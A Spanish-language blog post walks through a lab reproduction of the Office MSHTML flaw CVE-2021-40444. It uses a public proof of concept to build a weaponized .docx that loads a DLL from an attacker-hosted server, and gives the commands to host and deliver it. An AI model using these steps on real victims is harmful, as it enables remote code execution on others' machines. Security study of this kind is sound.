---
layout: post
title:  "Explotando la vulnerabilidad  Microsoft MSHTML CVE-2021-40444"
date:   2021-09-12 12:30:00 -0700
categories: jekyll ruby ubuntu docker
tags:
- Creador de contenido
- docker
- Ubuntu
---


El 7 de septiembre de 2021 Microsoft anuncia la vulnerabilidad CVE-2021-40444 de ejecución de código remoto en MSHTML, Microsoft reporta que tiene conocimiento de los atacantes que están usando esta vulnerabilidad por medio de un documento de office especialmente construido para explotar la vulnerabilidad.

Microsoft comenta que los atacantes están usando el motor de renderizado del navegador que usa office para crear un control malicioso de ActiveX, los atacantes tienen que convencer a la víctima que habrá el documento para logra conseguir que el ataque sea efectivo.

Para mitigar esta vulnerabilidad de forma alternativa se recomienda desactivar Activex controls desde internet Explorer. 
#Prerequisitos
Para esta prueba vamos a usar virtualbox, con las maquinas de Kali Linux y la maquina de desarrolladores de Windows, la maquina Windows necesita tener instalado office, y las dos maquinas virtuales necesitan que configuremos el adaptador de red en tipo puente.

# Como explotar la vulnerabilidad 

Para explotar esta vulnerabilidad un usuario de Github hizo ingeniería inversa a uno de los archivos que usan los atacantes, y publico los script en su repositorio, este repositorio será el que usaremos para nuestra PoC.
Antes de iniciar tenemos que tener instalado lcab
```console
sudo apt-get install lcab
```
Ya con lcab instado podemos continuar, lo primero que tenemos que hacer descargar el código a nuestra máquina.

```console
git clone https://github.com/lockedbyte/CVE-2021-40444
cd CVE-2021-40444
```

![Crepe](/assets/img/20210912/directorio-del-repositorio.png)

Generamos el docx malicio que usando un DLL, vamos a usar el que se encuentra en test que nos abre la Calculadora de Windows. Para generarlo usamos los scripts del repositorio

```console
python3 exploit.py generate test/calc.dll http://<SRV IP>
```
![Crepe](/assets/img/20210912/generando-el-archivo.png)


Donde SRV IP es la IP de la maquina donde lanzaremos el ataque, este paso nos genero un archivo en la carpeta out, ese archivo es el que tenemos que hacer llegar la maquina víctima.


Ahora tenemos que levantar el servidor que será el que el archivo consulte para explotar la vulnerabilidad, seguimos usando el mismo script del repositorio.

```console
sudo python3 exploit.py host 80
```
![Crepe](/assets/img/20210912/levantar-el-servidor.png)

ahora solo tenemos que mandar el archivo a la maquina victima.


Para hacer llegar a la victima el archivo vamos a usar un web server con Python y desde la maquina victima entramos al link y descargamos el archivo.

Lo que tenemos que hacer es abrir una nueva terminal y dirigirnos a la carpeta out del repositorio 

```console
cd CVE-2021-40444/out
ls
```


![Crepe](/assets/img/20210912/ls-de-out.png)


En esta carpeta levantamos el servidor web con Python

```console
Python3 -m http.server
```

![Crepe](/assets/img/20210912/http-server.png)


Esto nos habilita un servidor en el equipo por el puerto 8000, este lo tendremos que abrir desde la maquina de la victima descargar el archivo y ejecutarlo.


# Paso final 

Abrir el link con la descarga del archivo.


![Crepe](/assets/img/20210912/descargando-el-archivo.png)

y lo ejecutamos

![Crepe](/assets/img/20210912/ejecuntando-el-archivo.png)

Al ejecutar el archivo nos abre el office, después se abre una ventana de CMD y la calculadora.

Así es como los atacantes hacen y mandan sus archivos malicioso.

Espero entendamos mejor cómo funciona la vulnerabilidad CVE-2021-40444, y recuerden que esta información es compartida a ustedes con el fin de aprender un poco sobre seguridad informática, y para que ustedes puedan realizar pruebas en una red administrada por ustedes. Agradecemos al usuario lockedbyte por compartir los resultados de su investigación.

# Referencias

* [Notica](https://www.huntress.com/blog/cybersecurity-advisory-hackers-are-exploiting-cve-2021-40444)
* [Repositorio en Github](https://github.com/lockedbyte/CVE-2021-40444)
* [VirusTotal de archivo usado por atacantes](https://www.virustotal.com/gui/url/0f9b8ba7ad03f5b5baa46f92ab4432dfcbcf6f97c9f9ffbf3970cfa70319c1cc/detection)
* [Comunicado de Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444)